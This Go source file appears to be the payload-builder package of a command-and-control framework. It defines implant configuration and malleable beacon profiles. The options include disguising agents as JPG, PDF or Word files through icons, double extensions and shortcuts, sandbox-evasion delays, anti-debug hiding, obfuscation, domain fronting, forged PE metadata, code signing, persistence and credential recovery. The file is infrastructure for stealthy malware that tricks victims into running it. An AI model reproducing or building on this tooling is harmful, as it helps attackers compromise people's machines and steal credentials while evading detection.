package payload

import (
	"embed"
	"regexp"
	"strings"
	"sync"
	"time"
)

// buildTidyTimeout bounds a single `go mod tidy` invocation. Network stalls
// during module resolution are the most common cause of a hung build, so this
// is bounded separately from compilation.
const buildTidyTimeout = 6 * time.Minute

// buildCompileTimeout bounds a single `go build`/`garble build` invocation.
// With a single build worker this prevents one hung process (e.g. a CGO
// cross-compile hang) from blocking the entire build pipeline indefinitely.
const buildCompileTimeout = 15 * time.Minute

// buildTimeout is retained as the default bound for any other toolchain step
// (donut, stager, obfuscation) that has not been given a dedicated timeout.
const buildTimeout = buildCompileTimeout

//go:embed agent/* powershell_template.ps1 profiles/* loader/*.go
var payloadFS embed.FS

//go:embed icons/*.ico
var iconsFS embed.FS

//go:embed win7shim
var win7shimFS embed.FS

// ttlCache memoizes a resolved string (e.g. a toolchain path) but refreshes it
// after a TTL elapses. A one-shot sync.Once would never pick up environment
// changes (PATH/GOROOT updates, a freshly installed tool), so the resolver is
// re-run periodically. The zero value is not usable; construct with ttl and
// resolve set.
type ttlCache struct {
	mu      sync.Mutex
	value   string
	at      time.Time
	ttl     time.Duration
	resolve func() string
}

var (
	configuredGoProxyMu sync.Mutex
	configuredGoProxy   string
)

// goCmdCacheTTL bounds how long a resolved go/garble path is trusted before a
// re-resolution. Short enough to pick up newly installed toolchains, long
// enough to avoid repeated filesystem/exec probes on the hot path.
const goCmdCacheTTL = 5 * time.Minute

var goCmdCache = &ttlCache{
	ttl:     goCmdCacheTTL,
	resolve: resolveGoCmd,
}

var garbleCmdCache = &ttlCache{
	ttl:     goCmdCacheTTL,
	resolve: resolveGarbleCmd,
}

// presetIcons holds embedded ICO presets for common disguises.
// Each entry is base64-encoded .ico populated at init from icons/*.ico.
var presetIcons = map[string]string{
	"jpg":    "",
	"pdf":    "",
	"word":   "",
	"folder": "",
	"chrome": "",
	"zip":    "",
	"doc":    "",
	"xls":    "",
}

// selfCheckPlaceholder is the 64-'0' hex string injected at build time for the
// self-integrity hash. The builder replaces it with the real SHA-256 of the
// finalized binary. 64 zero hex chars are used because the patch is an
// in-place byte replacement of identical length, and a run of 512 zero bits is
// not expected to occur coincidentally in a real binary.
const selfCheckPlaceholder = "0000000000000000000000000000000000000000000000000000000000000000"

// buildGoMod generates a go.mod file for the target OS. When slim is set
// (light/http-only profile) the grpc/quic/wss stacks are dropped alongside
// their exclusive dependencies; utls stays because it is the shared TLS
// fingerprint layer for HTTPS/DoT/mTLS, and sqlite stays for credential
// recovery. Measured saving on windows/amd64: ~23.3MB -> ~17.0MB.
// win7Toolchain pins the language version fetched for legacy Windows
// targets. The stock toolchain auto-downloads it on first use (needs
// network once); GOTOOLCHAIN is set per-build so the host default is
// untouched. garble is incompatible with this line and rejected separately.
const win7Toolchain = "go1.20.14"

// win7ShimPkgs maps embedded mirror subdirs to the import paths they
// satisfy inside the stub parent module.
var win7ShimPkgs = []struct{ dir, importPath string }{
	{"crypto", "internal/crypto"},
	{"protocol", "pkg/protocol"},
	{"encoding", "pkg/encoding"},
}

// win7ShimModulePath is the stub module location inside the temp build dir,
// mirrored by the replace rewrite in materializeWin7Shim.
const win7ShimModulePath = "win7shimroot/github.com/forgec2/forgec2"

const defaultWindowsUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

const (
	// Analytics-mimic beacon endpoint (POST /collect at root; legacy /api/v1/beacon kept as alias).
	defaultBeaconURI = "/collect"
	// WebSocket beacon endpoint (GET route registered in routes.go). The
	// server upgrades ONLY this path for beacon WebSockets, so a WSS build
	// must never keep the plain HTTP URI: the WS handshake would fail and
	// the agent would silently downgrade to HTTPS POST.
	defaultWSBeaconURI = "/ws/beacon"
)

var profileNameSanitizer = regexp.MustCompile(`[^a-zA-Z0-9_-]+`)

// MalleableProfile defines customizable beacon behavior similar to Cobalt Strike.
// v2 fields (beacon_uris, transform chains, jitter extensions) are optional
// and backward compatible: old readers ignore them, new code prefers them.
type MalleableProfile struct {
	Name        string            `json:"name"`
	Description string            `json:"description"`
	UserAgent   string            `json:"user_agent"`
	BeaconURI   string            `json:"beacon_uri"`
	Method      string            `json:"method"` // GET or POST
	Headers     map[string]string `json:"headers"`
	Sleep       int               `json:"sleep"`
	Jitter      int               `json:"jitter"`
	Prepend     string            `json:"prepend,omitempty"` // bytes prepended to server HTTP responses
	Append      string            `json:"append,omitempty"`  // bytes appended to server HTTP responses
	// Request-side transforms (applied by the agent to outbound beacons).
	RequestPrepend string            `json:"request_prepend,omitempty"`
	RequestAppend  string            `json:"request_append,omitempty"`
	RequestHeaders map[string]string `json:"request_headers,omitempty"`
	// RequestHeaderPool rotates one extra decoy header per beacon.
	RequestHeaderPool []string `json:"request_header_pool,omitempty"`
	// v2: multi-URI rotation and full transform chains (CS parity).
	BeaconURIs          []string `json:"beacon_uris,omitempty"`
	URIs                []string `json:"uris,omitempty"`
	ClientMetadata      string   `json:"client_metadata,omitempty"`
	ClientID            string   `json:"client_id,omitempty"`
	ServerOutput        string   `json:"server_output,omitempty"`
	ContentLengthJitter int      `json:"content_length_jitter,omitempty"`
	JitterURI           bool     `json:"jitter_uri,omitempty"`
	JitterParameter     bool     `json:"jitter_parameter,omitempty"`
	Parameter           string   `json:"parameter,omitempty"`
	ParameterNames      []string `json:"parameter_names,omitempty"`
	// Placements: JSON array of {target, chain}, e.g.
	// [{"target":"cookie:SESSION","chain":"base64"}].
	Placements string `json:"placements,omitempty"`
	// UA rotation pool (one per line in UI); empty = single UserAgent.
	UserAgents []string `json:"user_agents,omitempty"`
	// Working-hours window; empty = disabled (per-build form wins).
	WorkStart string `json:"work_start,omitempty"`
	WorkEnd   string `json:"work_end,omitempty"`
	WorkTZ    string `json:"work_tz,omitempty"`
}

// ImplantConfig holds parameters injected into the generated agent (EXE or PS1).
// All agents must be produced exclusively through the Generate page.
type ImplantConfig struct {
	C2URL            string
	Protocol         string // http, tcp, p2p
	Interval         int
	Jitter           int
	UserAgent        string
	Persist          bool
	SkipTLSVerify    bool
	Filename         string // for output name
	Debug            bool   // for debug agent (shows console logs)
	Profile          string // malleable profile name
	BeaconURI        string
	Method           string
	ListenerID       uint
	P2PMode          string // "", "smb", "tcp" — how parent listens for children
	P2PParent        string // parent agent addr to connect to (child mode)
	P2PListenAddr    string // parent listen addr (pipe name or tcp addr)
	DNSDomain        string // DNS C2 domain (e.g. "c2.example.com")
	DNSServer        string // DNS C2 server IP
	Proxy            string // HTTP proxy URL (e.g. "http://proxy:8080")
	CryptoKey        string // 32-byte hex key for StreamCipher (empty = disabled)
	BeaconKey        string // PSK used to derive registration auth (empty = no PSK auth)
	RegSecretID      string // v3 per-implant registration secret id (compiled into the binary)
	RegSecret        string // v3 per-implant registration secret, base64 (replaces BeaconKey in v3 builds)
	ExpiryDate       string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
	SelfCheck        bool   // Embed a SHA-256 self-integrity hash and verify it at startup (empty = disabled)
	MalleablePrepend string // bytes prepended to server HTTP responses (strip on parse)
	MalleableAppend  string // bytes appended to server HTTP responses (strip on parse)
	// Request-side malleable transforms: applied by the agent to the OUTGOING
	// beacon body and as request headers; the server strips the body wrapping
	// on inbound. Distinct from MalleablePrepend/Append (response-side).
	MalleableRequestPrepend string
	MalleableRequestAppend  string
	MalleableRequestHeaders map[string]string
	Evasion                 bool   // Enable chunked sleep obfuscation (Windows EDR basics)
	GhostMode               bool   // Enable ghost protocol (sandbox/anti-debug deep-hiding; opt-in, default off)
	Obfuscate               bool   // Enable garble build-time obfuscation (string/literal hiding)
	DomainFront             string // CDN front domain for domain fronting ("" = disabled)
	Architecture            string // "amd64" (default), "arm64", "arm"
	// Max random bytes appended to the HTTP/WS beacon body so the on-wire
	// body length varies per beacon (0=disabled). The server strips the
	// 8-byte length prefix on inbound; see stripBodyPadding/padBeaconBody.
	ContentLengthJitter int
	// Startup delay window (seconds) before the first beacon: the agent
	// sleeps a per-boot random duration in [StartDelayMin, StartDelayMax] to
	// blunt sandbox detonation timelines. 0/0 = disabled. Capped at 600s.
	StartDelayMin int
	StartDelayMax int
	// Beacon randomization mode: controls how the beacon interval is randomized.
	// "linear" (default): uniform random within ±jitter% of interval
	// "gaussian": normal distribution centered at interval, stddev = interval * jitter%
	// "exponential": exponential decay (more frequent shorter intervals)
	// "two_stage": random base interval [interval*0.7..interval*1.3] + jitter within that
	// "adaptive": dynamically adjust based on network conditions and time of day
	BeaconRandomization string
	// MaxRandomIntervalMs caps the maximum random delay added per beacon (0 = no cap).
	// Prevents excessive delays that could cause session expiry.
	MaxRandomIntervalMs int
	// Slim builds the light/http-only profile: the grpc/quic/wss transports
	// are compiled out (stubs report plainly at runtime), cutting ~30% off
	// the binary. Incompatible with BeaconTransport grpc/quic/wss.
	// Slim is now the shorthand for excluding the transports_advanced agent
	// module (see agent_modules.go); Modules below selects the rest.
	Slim bool
	// Modules lists the optional agent modules compiled into this build (see
	// agent_modules.go). Empty = every module. Unknown names and unmet
	// dependencies are rejected before the build starts.
	Modules []string
	// UPX runs an optional post-build UPX --lzma pass (exe/elf only).
	// Missing upx binary = skip, never a build failure.
	UPX bool
	// Win7Compat targets Windows 7 / Server 2008 R2: the build switches to
	// the go1.20.14 toolchain (auto-downloaded once, needs network) with
	// repinned dependencies. Forces Slim on and forbids garble obfuscation.
	Win7Compat bool
	// Working hours
	WorkingStart string // HH:MM start of working hours (empty = disabled)
	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
	WorkingTZ    string // IANA timezone (empty = UTC)
	// Server-wide working-hours default (implant.default_working_*); last
	// resort after explicit form and profile window.
	DefaultWorkingStart string
	DefaultWorkingEnd   string
	DefaultWorkingTZ    string
	// Advanced transport (injected as ldflags into agent)
	BeaconTransport string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c, udp, quic
	DNSDoHURL       string
	DNSDoTAddr      string
	SSHUser         string
	SSHPassword     string
	SSHKey          string // base64 PEM client private key
	SSHHostKey      string // base64 server host public key pin (empty = lab insecure)
	// mTLS client credentials (PEM). Embedded in the AES-GCM config blob as
	// base64 — the same form hand-built -X main.MTLS*Str builds use — so the
	// client private key never lands on the go build argv. Empty = the build
	// cannot authenticate against a listener that requires client certs.
	MTLSCertPEM      string
	MTLSKeyPEM       string
	MTLSCAPEM        string
	PinnedCertSHA256 string // SHA-256 hex of server DER cert for pinning (empty = disabled)
	SelfCheckSHA256  string // SHA-256 hex of the binary itself for integrity verification (empty = disabled)
	// NetworkConfigOverWire, when set, produces a bootstrap-only binary: the
	// compile-time config blob embeds only the per-implant secret and the
	// initial C2 endpoint. The full network config is delivered by the server
	// at registration (encrypted under the same secret), keeping operational
	// parameters off the disk artifact.
	NetworkConfigOverWire bool
	DNSObscure            bool
	// Windows resource customization (icon + version info + JPG disguise)
	IconB64         string // base64-encoded .ico (≤256KB, validated), empty = default Go icon
	IconPreset      string // preset key: jpg, pdf, word, folder, chrome — server maps to embedded ico
	FileDescription string // VersionInfo FileDescription (e.g. "JPEG Image")
	CompanyName     string // VersionInfo CompanyName
	DisguiseAs      string // "jpg" | "pdf" | "doc" | "xls" | "zip" | "" — filename becomes *.ext.exe and icon defaults to preset
	LNKDisguise     bool   // when true, also emit a .lnk shortcut alongside the exe
	// PE forensic options (user selectable, default zero/default/none)
	PETimestampMode string // "zero" | "random" | "keep" — PE timestamp handling
	PESectionMode   string // "default" | "random" — section name randomization
	PEImportMode    string // "none" | "kernel32+user32" — benign import mimic
	PEManifestMode  string // "default" | "blend" — dpiAware + Win10 compatibility
	// v2 malleable chains (wire form, agent parses via MalleableRespDecode).
	MalleableServerOutput   string
	MalleableClientMetadata string
	MalleableClientID       string
	BeaconURIs              []string
	RequestHeaderPool       []string
	Parameter               string
	// Placements: JSON array of {target, chain} cover copies.
	Placements string
	// UA rotation pool.
	UserAgents []string
	// Timing jitter extensions.
	JitterURI      bool
	ParameterNames []string
	// Authenticode code signing (Windows EXE/DLL only). SignMode is "",
	// "none", "self", "pfx" or "pem". PFX/PEM material is per-build and kept
	// in memory only: it is never persisted, logged or audited.
	SignMode        string
	SignOrg         string // organization for self-signed certificates
	SignPFX         []byte // PKCS#12 bundle for sign_mode=pfx
	SignPFXPassword string
	SignCertPEM     []byte // PEM certificate chain for sign_mode=pem
	SignKeyPEM      []byte // PEM private key for sign_mode=pem
	// OriginalFilename is the operator-visible filename without the server's
	// 8-hex uniqueness prefix; it is embedded in VersionInfo. Empty falls back
	// to the output filename.
	OriginalFilename string
}

// CodeSigningEnabled reports whether this build requested Authenticode signing.
func (c ImplantConfig) CodeSigningEnabled() bool {
	switch strings.ToLower(strings.TrimSpace(c.SignMode)) {
	case "", "none":
		return false
	default:
		return true
	}
}

// slimTransportStubs replaces the excluded transports' entry points. A stubbed
// transport behaves like an unreachable endpoint (nil response, debug log) so
// failover simply moves on instead of wedging the beacon loop.
const slimTransportStubs = `package main

func sendGRPCBeacon(body []byte) []byte {
	if Debug {
		println("[!] grpc transport not compiled into this light build")
	}
	return nil
}

func sendQUICBeacon(body []byte) []byte {
	if Debug {
		println("[!] quic transport not compiled into this light build")
	}
	return nil
}

func sendWSSBeacon(body []byte) []byte {
	if Debug {
		println("[!] wss transport not compiled into this light build")
	}
	return nil
}
`

// utlsCredsMarker starts transport_utls.go's grpc-only tail, which imports
// google.golang.org/grpc. Slim builds cut everything from this marker.
const utlsCredsMarker = "// utlsCreds implements"

// supportedArchByOS lists the architectures the embedded agent actually builds
// and runs for each target OS. Architectures outside this set (e.g. 32-bit
// Windows 386) must be rejected explicitly rather than silently cross-compiled
// to amd64, which would ship a binary that fails to run on the operator's
// target ("This app can't run on your PC") while passing PE validation.
var supportedArchByOS = map[string][]string{
	"windows": {"amd64", "arm64"},
	"linux":   {"amd64", "arm64", "arm"},
	"darwin":  {"amd64", "arm64"},
}
